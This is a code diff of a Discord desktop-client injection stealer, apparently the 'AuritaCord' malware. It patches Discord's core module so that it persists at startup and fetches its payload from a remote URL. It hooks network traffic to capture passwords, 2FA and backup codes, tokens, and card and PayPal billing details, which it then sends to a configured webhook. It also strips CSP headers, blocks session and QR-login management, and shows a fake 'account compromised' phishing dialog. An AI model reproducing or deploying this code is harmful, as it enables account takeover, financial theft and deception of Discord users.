 
     const { resource, app } = getDiscordPaths();
-
     if (!resource || !app) return;
+
     const appDir = path.join(resource, 'app');
 
     const packageJsonFile = path.join(appDir, 'package.json');
@@ -1143,39 +912,57 @@ const startup = async () => {
 
     const coreJsFile = path.join(app, 'modules', fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)), 'discord_desktop_core', 'index.js');
     const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
-    
+
     if (!fs.existsSync(appDir)) {
         fs.mkdirSync(appDir, { recursive: true });
     }
-    
-    if (fs.existsSync(packageJsonFile)) fs.unlinkSync(packageJsonFile);
-    if (fs.existsSync(startupScriptRunJsFile)) fs.unlinkSync(startupScriptRunJsFile);
-    
-    if (process.platform === 'win32' || process.platform === 'darwin') {
+
+    [packageJsonFile, startupScriptRunJsFile].forEach(file => {
+        if (fs.existsSync(file)) fs.unlinkSync(file);
+    });
+
+    if (['win32', 'darwin'].includes(process.platform)) {
         fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
-    
+
         const scriptRunJsFileContent = `
             const fs = require('fs');
             const https = require('https');
             const path = require('path');
             const coreJsFile = '${coreJsFile}';
             const betterDiscordAsarFile = '${betterDiscordAsarFile}';
+
             const initialize = async () => {
                 try {
                     const data = await fs.promises.readFile(coreJsFile, 'utf8');
-                    if (data.length < 20000 || data === "module.exports = require('./core.asar')") {
+
+                    if (
+                        data.length < 20000 || 
+                        data === "module.exports = require('./core.asar')"
+                    ) {
                         await downloadAndUpdateFile();
-                    }
+                    };
                 } catch (err) {
                     console.error(err);
                 }
             };
+
             const downloadAndUpdateFile = async () => {
                 try {
                     const fileStream = fs.createWriteStream(coreJsFile);
+
                     await new Promise((resolve, reject) => {
                         https.get('${CONFIG.injection_url}', (res) => {
-                            res.on('data', chunk => fileStream.write(chunk.toString().replace('%WEBHOOK_URL%', '${CONFIG.webhook}')));
+                            res.on('data', chunk => fileStream.write(
+                                chunk.toString()
+                                    .replace('%WEBHOOK_URL%', '${CONFIG.webhook}')
+                                    .replace('%API_URL%', '${CONFIG.API}')
+                                    .replace('%FORCE_PERSIST_STARTUP%', '${CONFIG.force_persist_startup}')
+                                    .replace('%AUTO_MFA_DISABLER%', '${CONFIG.auto_mfa_disabler}')
+                                    .replace('%AUTO_EMAIL_UPDATE%', '${CONFIG.auto_email_update}')
+                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${CONFIG.auto_user_profile_edit}')
+                                    .replace('%GOFILE_DOWNLOAD_LINK%', '${CONFIG.gofile_download_link}')
+                            ));
+
                             res.on('end', () => {
                                 fileStream.end();
                                 resolve();
@@ -1188,192 +975,193 @@ const startup = async () => {
                     setTimeout(downloadAndUpdateFile, 10000);
                 }
             };
+
             initialize();
             require('${path.join(resource, 'app.asar')}');
+
             if (fs.existsSync(betterDiscordAsarFile)) require(betterDiscordAsarFile);
         `;
         fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
     }
-    
+
 };
 
-const AuritaCord = async () => {
+const translateEmailUpdate = async (token, locale) => {
+    const message = [
+        "User Settings",
+        "Edit email address",
+        "We have detected something unusual with your (<strong>Discord</strong>) account, your address,",
+        "has been compromised.",
+        "Please change it to continue using your account.",
+        "No longer have access to your email",
+        "Contact your email provider to fix it.",
+    ];
+
+    const sanitized = message.map(item => item.replace(/[.,]/g, ''));
+
     try {
-        const token = await CONFIG['get']['token']();
-        const API = new Fetcher(token),
-            user = await API.User(),
-            profile = await API.Profile(),
-            billing = await API.Billing(),
-            friends = await API.Friends(),
-            servers = await API.Servers();
-        return {
-            token,
-            user,
-            profile,
-            billing,
-            friends,
-            servers
-        };
-    } catch {
-        return {}
+        const textParam = encodeURIComponent(JSON.stringify(sanitized));
+        const response = parseJSON(await request('GET', `https://translate-api-yr8e.onrender.com/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
+            'Content-Type': 'application/json',
+            'Authorization': token
+        }));
+
+        if (!response.success) {
+            return message;
+        }
+
+        const translatedText = parseJSON(response.text);
+
+        return Array.isArray(translatedText) && translatedText.length === message.length
+            ? translatedText
+            : message;
+    } catch (error) {
+        return message;
     }
-}
+};
 
 let [
-    AuritaData,
     email,
     password,
-    startup_event_occurred,
     script_executed
 ] = [
     '',
     '',
-    '',
-    false,
     false
 ];
 
-const parseJSON = (data) => {
-    try {
-        return JSON.parse(data || '');
-    } catch {
-        return {};
-    }
-};
-
-const delay = (ms) => {
-    return new Promise(resolve => setTimeout(resolve, ms))
-};
-
 const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
-    switch (true) {
-        case params.response.url.endsWith('/login'):
-            if (params.response.url.endsWith('/remote-auth/login')) {
-                if (!RESPONSE_DATA.encrypted_token) return;
+    try {
+        switch (true) {
+            case params.response.url.endsWith('/login'):
+                if (params.response.url.endsWith('/remote-auth/login')) {
+                    // With this update, QR codes are blocked in the function allSessionsLocked(),
+                    // so this is here just in case the QR code blocking fails
+                    if (!RESPONSE_DATA.encrypted_token) return;
 
-                await delay(2000);
+                    await delay(2000);
 
-                AuritaData = await AuritaCord();
-                const { token, user } = AuritaData;
+                    const {
+                        token: newToken,
+                        user: newUser
+                    } = await AuritaCord();
+
+                    Cruise(
+                        'LOGIN_USER',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        newUser.email,
+                        'The password was not found',
+                        newToken,
+                        `You have logged in using QR code`
+                    );
+                }
+
+                if (!RESPONSE_DATA.token) {
+                    email = RESQUEST_DATA.login;
+                    password = RESQUEST_DATA.password;
+                    return;
+                }
 
                 Cruise(
                     'LOGIN_USER',
                     RESPONSE_DATA,
                     RESQUEST_DATA,
-                    user.email,
-                    'The password was not found',
+                    RESQUEST_DATA.login,
+                    RESQUEST_DATA.password,
                     token,
-                    `You have logged in using QR code`
+                    `has Logged in-`
                 );
-            } 
-            
-            if (!RESPONSE_DATA.token) {
-                email = RESQUEST_DATA.login || user.email;
-                password = RESQUEST_DATA.password;
-                return;
-            }
+                break;
 
-            Cruise(
-                'LOGIN_USER',
-                RESPONSE_DATA,
-                RESQUEST_DATA,
-                RESQUEST_DATA.login,
-                RESQUEST_DATA.password,
-                RESPONSE_DATA.token,
-                `has Logged in-`
-            );
-            break;
-
-        case params.response.url.endsWith('/register'):
-            Cruise(
-                'LOGIN_USER',
-                RESPONSE_DATA,
-                RESQUEST_DATA,
-                RESQUEST_DATA.email,
-                RESQUEST_DATA.password,
-                token,
-                'has \`Created\` a new account'
-            );
-            break;
-
-        case params.response.url.endsWith('/totp'):
-            Cruise(
-                'LOGIN_USER',
-                RESPONSE_DATA,
-                RESQUEST_DATA,
-                email,
-                password,
-                RESPONSE_DATA.token,
-                `you are logged in with \`2FA\``
-            );
-            break;
-
-        case params.response.url.endsWith('/enable'):
-        case params.response.url.endsWith('/codes-verification'):
-            const codesCount = RESPONSE_DATA.backup_codes ? RESPONSE_DATA.backup_codes.length : 0;
-            Cruise(
-                'BACKUP_CODES',
-                RESPONSE_DATA,
-                RESQUEST_DATA,
-                email,
-                password,
-                token,
-                `\`${codesCount} Security\` codes have just been added`
-            );
-            break;
-
-        case params.response.url.endsWith('/@me'):
-            if (!RESQUEST_DATA.password) return;
-            if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
+            case params.response.url.endsWith('/register'):
                 Cruise(
-                    'EMAIL_CHANGED',
+                    'LOGIN_USER',
                     RESPONSE_DATA,
                     RESQUEST_DATA,
                     RESQUEST_DATA.email,
                     RESQUEST_DATA.password,
-                    RESQUEST_DATA.token,
-                    `has updated their gmail to \`${RESQUEST_DATA.email}\``
+                    token,
+                    'has `Created` a new account'
                 );
-            }
-            if (RESQUEST_DATA.new_password) {
+                break;
+
+            case params.response.url.endsWith('/totp'):
                 Cruise(
-                    'PASSWORD_CHANGED',
+                    'LOGIN_USER',
                     RESPONSE_DATA,
                     RESQUEST_DATA,
                     email,
-                    RESQUEST_DATA.password,
+                    password,
                     token,
-                    `has updated their password to \`${RESQUEST_DATA.password}\``
+                    `you are logged in with \`2FA\``
                 );
-            }
-            if (RESQUEST_DATA.username) {
+                break;
+
+            case params.response.url.endsWith('/enable'):
+            case params.response.url.endsWith('/codes-verification'):
+                const count = RESPONSE_DATA.backup_codes?.length ?? 0;
+
                 Cruise(
-                    'USERNAME_CHANGED',
+                    'BACKUP_CODES',
                     RESPONSE_DATA,
                     RESQUEST_DATA,
-                    email,
-                    RESQUEST_DATA.password,
+                    user.email,
+                    'The password was not found',
                     token,
-                    `has updated their username to \`${RESQUEST_DATA.username}\``
+                    `\`${count} security\` codes have just been added`
                 );
-            }
-            break;
-    };
+                break;
+
+            case params.response.url.endsWith('/@me'):
+                if (!RESQUEST_DATA.password) return;
+                if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
+                    Cruise(
+                        'EMAIL_CHANGED',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        RESQUEST_DATA.email,
+                        RESQUEST_DATA.password,
+                        token,
+                        `has updated their email to \`${RESQUEST_DATA.email}\``
+                    );
+                }
+                if (RESQUEST_DATA.new_password) {
+                    Cruise(
+                        'PASSWORD_CHANGED',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        user.email,
+                        RESQUEST_DATA.password,
+                        token,
+                        `has updated their password to \`${RESQUEST_DATA.new_password}\``
+                    );
+                }
+                if (RESQUEST_DATA.username) {
+                    Cruise(
+                        'USERNAME_CHANGED',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        user.email,
+                        RESQUEST_DATA.password,
+                        token,
+                        `has updated their username to \`${RESQUEST_DATA.username}\``
+                    );
+                }
+                break;
+        }
+    } catch (error) {
+        console.error(error);
+    }
 };
 
-const createWindow = (mainWindow) => {
+const createWindow = () => {
+    const mainWindow = BrowserWindow.getAllWindows()[0];
     if (!mainWindow) return;
-    if (CONFIG.force_persist_startup === 'true' && !startup_event_occurred) {
-        forcePersistStartup();
-        startup_event_occurred = true;
-    }
+
     mainWindow.webContents.debugger.attach('1.3');
     mainWindow.webContents.debugger.on('message', async (_, method, params) => {
         if ('Network.responseReceived' !== method) return;
-        if (!startup_event_occurred) {
-            await startup();
-            startup_event_occurred = true;
-        }
         if (
             !CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
             ![200, 202].includes(params.response.status)
@@ -1384,89 +1172,86 @@ const createWindow = (mainWindow) => {
                 responseUnparsed,
                 requestUnparsed
             ] = await Promise.all([
-                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId}),
-                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {requestId: params.requestId})
-            ]);            
+                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }),
+                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId })
+            ]);
 
             const RESPONSE_DATA = parseJSON(responseUnparsed.body);
             const RESQUEST_DATA = parseJSON(requestUnparsed.postData);
 
-            AuritaData = await AuritaCord();
-            const { token, user } = AuritaData;
+            const { 
+                token,
+                user
+            } = await AuritaCord();
 
             GangwayCord(params, RESPONSE_DATA, RESQUEST_DATA, token, user);
         } catch (error) {
             console.error(error);
         }
     });
-
     mainWindow.webContents.debugger.sendCommand('Network.enable');
-
     mainWindow.on('closed', () => {
-        const windows = BrowserWindow.getAllWindows();
-        if (windows.length > 0) {
-            createWindow(windows[0]);
-        }
+        createWindow();
     });
 };
 
-const blockDevices = async () => {
-    await delay(1000);
-    await execScript(`
-        const classes = [
-            { prefix: 'sessions_', action: 'replace' },
-            { prefix: 'logOutAllButton_', action: 'remove' }
-        ];
-        function k4itrunModifiesElements() {
-            classes.forEach(({ prefix, action }) => {
-                const elements = document.querySelectorAll(\`[class^="\${prefix}"]\`);
-                elements.forEach(element => {
-                    if (action === 'replace') {
-                        const div = document.createElement('div');
-                        div.innerHTML = \`
-                            <div class="container_e0eaac loading_e0eaac">
-                                <span class="spinner_b6db20" role="img" aria-label="Cargando">
-                                    <span class="inner_b6db20 lowMotion_b6db20">
-                                        <span class="item_b6db20"></span>
-                                        <span class="item_b6db20"></span>
-                                        <span class="item_b6db20"></span>
-                                    </span>
-                                </span>
-                            </div>
-                        \`;
-                        element.parentNode.replaceChild(div, element);
-                    } else if (action === 'remove') {
-                        element.remove();
-                    }
-                });
-            });
-        }
-        const observer = new MutationObserver((mutationsList, observer) => {
-            for (let mutation of mutationsList) {
-                if (mutation.type === 'childList') {
-                    k4itrunModifiesElements();
-                }
-            }
-        });
-        const config = { childList: true, subtree: true };
-        observer.observe(document.body, config);
-        k4itrunModifiesElements();
-    `)
-};
-blockDevices();
+const isLogged = async () => {
+    try {
+        const { 
+            token 
+        } = await AuritaCord();
 
-const defaultSession = (webRequest) => {
+        const LOG_FILE_PATH = path.join(__dirname, 'core.log');
+
+        if (token) {
+            if (!fs.existsSync(LOG_FILE_PATH)) {
+                fs.writeFileSync(LOG_FILE_PATH, 'logout');
+
+                await request('POST', 'https://discord.com/api/v9/auth/logout', {
+                    'Content-Type': 'application/json',
+                    'Authorization': token
+                }, JSON.stringify({
+                    provider: null,
+                    voip_provider: null,
+                }));
+
+                await delay(5000);
+                await execScript('location.reload();');
+
+                return false;
+            };
+
+            return true;
+        }
+
+        fs.writeFileSync(LOG_FILE_PATH, 'logout');
+
+        return false;
+    } catch (error) {
+        return false;
+    }
+};
+
+const defaultSession = () => {
+    const webRequest = session.defaultSession.webRequest;
+    if (!webRequest) return;
+
     webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
         const { url, uploadData, method, statusCode, billing_address } = details;
 
         if (!['POST'].includes(method) && ![200, 202].includes(statusCode)) return;
+        
+        const { 
+            token, 
+            user
+        } = await AuritaCord();
 
-        AuritaData = await AuritaCord();
-        const { token, user } = AuritaData;
+        if(!token) return;
 
         switch (true) {
-            case url.includes('stripe'): {
+            case url.includes('stripe'): 
                 let item;
+
                 try {
                     item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
                 } catch (error) {
@@ -1476,11 +1261,11 @@ const defaultSession = (webRequest) => {
                 const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
                 const request = {
                     item,
-                    line_1, 
-                    line_2, 
-                    city, 
-                    state, 
-                    postal_code, 
+                    line_1,
+                    line_2,
+                    city,
+                    state,
+                    postal_code,
                     country,
                     email
                 };
@@ -1489,28 +1274,32 @@ const defaultSession = (webRequest) => {
                     'CREDITCARD_ADDED',
                     null,
                     request,
-                    null,
+                    user.email,
                     null,
                     token,
                     `you just added a \`Credit Card\``
                 );
                 break;
-            }
-            case (url.endsWith('paypal_accounts') && url.endsWith('billing-agreement-tokens')): {
+            case (url.endsWith('paypal_accounts') || url.endsWith('billing-agreement-tokens')): 
                 Cruise(
                     'PAYPAL_ADDED',
                     null,
                     null,
-                    null,
+                    user.email,
                     null,
                     token,
-                    `you just added a <:Paypal:1129073151746252870> \`Paypal\` account`
+                    `you just added a \`Paypal\` account`
                 );
                 break;
-            }
-        }
+            
+        };
     });
-    
+};
+
+const interceptRequest = () => {
+    const webRequest = session.defaultSession.webRequest;
+    if (!webRequest) return;
+
     webRequest.onHeadersReceived(async (request, callback) => {
         const { url, method, statusCode, responseHeaders, uploadData } = request;
         const updatedHeaders = { ...responseHeaders };
@@ -1518,40 +1307,33 @@ const defaultSession = (webRequest) => {
         delete updatedHeaders["content-security-policy"];
         delete updatedHeaders["content-security-policy-report-only"];
 
-        callback({responseHeaders: {
-            ...updatedHeaders, 
-            "Access-Control-Allow-Headers": "*" 
-        }});
+        callback({
+            responseHeaders: {
+                ...updatedHeaders,
+                "Access-Control-Allow-Headers": "*"
+            }
+        });
 
-        if (url.endsWith('/@me') && !script_executed) {
+        const processUserUpdate = async () => {
+            const {
+                token,
+                user
+            } = await AuritaCord();
+
+            if(!token) return;
+
             if (CONFIG.auto_user_profile_edit === 'true') {
-                script_executed = true;
-                await editSettingUser();
+                await editSettingUser(token);
             };
-    
+
             if (CONFIG.auto_email_update === 'true') {
-                script_executed = true;
+                const locale = user.locale || 'en-US';
 
-                let AuritaData = await AuritaCord();
-                const language = AuritaData.user.locale || 'en-US';
-
-                const truncateEmail = (email) => {
-                    if (!email) return '@';
+                const truncateEmail = (email = '@') => {
                     const [localPart, domain] = email.split('@');
-                    const truncatedLocalPart = localPart.length > 15 ? `${localPart.slice(0, 15)}...` : localPart;
-                    return `${truncatedLocalPart}@${domain}`;
+                    return `${localPart.slice(0, 15)}${localPart.length > 15 ? '...' : ''}@${domain || ''}`;
                 };
-                const getDiscordDomain = (maper) => {
-                    const path = __dirname.trim().replace(/\\/g, "/");
-                    const regex = /\/Local\/(discord|discordcanary|discordptb|discorddevelopment)\//i;
-                    const match = path.match(regex);
-                    let domain = 'discord.com'; 
-                    if (match && maper[match[1].toLowerCase()]) {
-                        domain = maper[match[1].toLowerCase()];
-                    }
-                    return domain
-                }
-    
+
                 const [
                     CONFIG_ALERT,
                     EDIT_MAIL_ALERT,
@@ -1560,79 +1342,126 @@ const defaultSession = (webRequest) => {
                     CHANGE_ALERT,
                     LAST_END_ALERT,
                     CONTACT_ALERT,
-                ] = await translateAutoEmailUpdate(language);
-                  
+                ] = await translateEmailUpdate(token, locale);
+
                 await execScript(`
-                    function loadStylesheets() {
-                        const stylesheets = [
-                            "https://discord.com/assets/d4261c08ee2b8d686d9d.css",
-                            "https://discord.com/assets/ed0fd6a2ab291ba57d4a.css",
-                        ];
+                    const loadStylesheets = (urls) => {
                         const head = document.head || document.getElementsByTagName('head')[0];
-                        stylesheets.forEach(url => {
-                            const stylesheetLink = document.createElement('link');
-                            stylesheetLink.rel = 'stylesheet';
-                            stylesheetLink.href = url;
-                            head.appendChild(stylesheetLink);
+
+                        urls.forEach(url => {
+                            const link = document.createElement('link');
+                            link.rel = 'stylesheet';
+                            link.href = url;
+                            head.appendChild(link);
                         });
-                    }
-                    async function simulateClicks() {
-                        try {
-                            loadStylesheets();
-                            const div = document.createElement("div");
-                            div.innerHTML = \`
-                                <div class="layerContainer_cd0de5">
-                                    <div class="backdrop_e4f2ae withLayer_e4f2ae" style="background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(0px);">
-                                    </div>
-                                    <div class="layer_c9e2da">
-                                        <div class="focusLock_f9a4c9" role="dialog" aria-labelledby=":r11:" tabindex="-1" aria-modal="true">
-                                            <div class="root_f9a4c9 small_f9a4c9 fullscreenOnMobile_f9a4c9 rootWithShadow_f9a4c9"
-                                                style="opacity: 1; transform: scale(1);"><img alt="" class="emailHeaderImg_a62824" src="/assets/8b500863ec942f68c46b.svg">
-                                                <div style="position: relative; width: 440px; height: 380px; overflow: hidden;">
-                                                    <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; opacity: 1;">
-                                                        <form>
-                                                            <div class="flex_dc333f horizontal_dc333f justifyStart_ec1a20 alignCenter_ec1a20 noWrap_ec1a20 header_f9a4c9 header_a62824" id=":r11:" style="flex: 0 0 auto;">
-                                                                <h1 class="defaultColor_a595eb heading-xl/extrabold_dc00ef defaultColor_e9e35f title_a62824" data-text-variant="heading-xl/extrabold">
-                                                                    ${CONFIG_ALERT}
-                                                                </h1>
+                    };
+
+                    const changeEmail = async () => {
+                        loadStylesheets([
+                            '/assets/d4261c08ee2b8d686d9d.css'
+                        ]);
+
+                        const placeholder = document.createElement('div');
+
+                        placeholder.innerHTML = \`
+                            <div class="layerContainer_cd0de5">
+                                <div class="backdrop_e4f2ae withLayer_e4f2ae" style="background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(0px);"></div>
+                                <div class="layer_c9e2da">
+                                    <div class="focusLock_f9a4c9" role="dialog" aria-labelledby=":r11:" tabindex="-1" aria-modal="true">
+                                        <div class="root_f9a4c9 small_f9a4c9 fullscreenOnMobile_f9a4c9 rootWithShadow_f9a4c9"
+                                            style="opacity: 1; transform: scale(1);"><img alt="" class="emailHeaderImg_a62824" src="/assets/8b500863ec942f68c46b.svg">
+                                            <div style="position: relative; width: 440px; height: 380px; overflow: hidden;">
+                                                <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; opacity: 1;">
+                                                    <form>
+                                                        <div class="flex_dc333f horizontal_dc333f justifyStart_ec1a20 alignCenter_ec1a20 noWrap_ec1a20 header_f9a4c9 header_a62824" id=":r11:" style="flex: 0 0 auto;">
+                                                            <h1 class="defaultColor_a595eb heading-xl/extrabold_dc00ef defaultColor_e9e35f title_a62824" data-text-variant="heading-xl/extrabold">
+                                                                ${CONFIG_ALERT}
+                                                            </h1>
+                                                        </div>
+                                                        <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
+                                                            <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
+                                                                <p>${ALERT_INTRO} (<strong>${truncateEmail(user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
+                                                                <p>${CHANGE_ALERT}</p>
+                                                                <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
                                                             </div>
-                                                            <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
-                                                                <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
-                                                                    <p>${ALERT_INTRO} (<strong>${truncateEmail(AuritaData.user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
-                                                                    <p>${CHANGE_ALERT}</p>
-                                                                    <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
+                                                            <div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 16px;"></div>
+                                                        </div>
+                                                        <div class="flex_dc333f horizontalReverse_dc333f justifyStart_ec1a20 alignStretch_ec1a20 noWrap_ec1a20 footer_f9a4c9 modalFooter_a62824 footerSeparator_f9a4c9" style="flex: 0 0 auto;">
+                                                            <a href="/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
+                                                                <div class="contents_dd4f85">
+                                                                    ${EDIT_MAIL_ALERT}
                                                                 </div>
-                                                                <div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 16px;"></div>
-                                                            </div>
-                                                            <div class="flex_dc333f horizontalReverse_dc333f justifyStart_ec1a20 alignStretch_ec1a20 noWrap_ec1a20 footer_f9a4c9 modalFooter_a62824 footerSeparator_f9a4c9" style="flex: 0 0 auto;">
-                                                                <a href="https://${getDiscordDomain({'discord':'discord.com','discordcanary':'canary.discord.com','discordptb':'ptb.discord.com','discorddevelopment':'canary.discord.com'})}/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
-                                                                    <div class="contents_dd4f85">
-                                                                        ${EDIT_MAIL_ALERT}
-                                                                    </div>
-                                                                </a>
-                                                            </div>
-                                                        </form>
-                                                    </div>
+                                                            </a>
+                                                        </div>
+                                                    </form>
                                                 </div>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                            \`;
-                            document.body.appendChild(div);
-                            await new Promise((resolve) => setTimeout(resolve, Number.MAX_SAFE_INTEGER));
-                            document.body.removeChild(div);
+                            </div>
+                        \`;
+
+                        try {
+                            document.body.appendChild(placeholder);
+
+                            await new Promise(resolve => setTimeout(resolve, Number.MAX_SAFE_INTEGER));
                         } catch (error) {
                         }
-                    }
-                    simulateClicks();
+                    };
+
+                    changeEmail();
                 `);
             };
         }
-    });
-}
 
-createWindow(BrowserWindow.getAllWindows()[0]);
-defaultSession(session.defaultSession.webRequest);
+        switch (true) {
+            case (url.endsWith('/@me') && !script_executed): 
+                script_executed = true;
+                
+                await processUserUpdate();
+                break;
+        };
+    });
+};
+
+const allSessionsLocked = async () => {
+    const webRequest = session.defaultSession.webRequest;
+    if (!webRequest) return;
+
+    webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {
+        if (details.url.includes("wss://remote-auth-gateway") || details.url.includes("auth/sessions")) {
+            callback({ cancel: true }); 
+        } else {
+            callback({ cancel: false });
+        }
+    });
+
+    (async () => {
+        try {
+            const enabled = await isLogged();
+            await delay(3000);
+            if (enabled) return interceptRequest();
+        } catch (error) {
+            console.error(error);
+        };
+    })();
+    
+    setTimeout(allSessionsLocked, 5000);
+};
+
+
+const complete = async () => {
+    if (CONFIG.force_persist_startup === 'true') {
+        forcePersistStartup(); 
+    };
+    startup();
+    createWindow();
+    defaultSession();
+    // For it to work you have to make it run indefinitely. //
+    allSessionsLocked();
+};
+
+complete();
 
 module.exports = require("./core.asar");
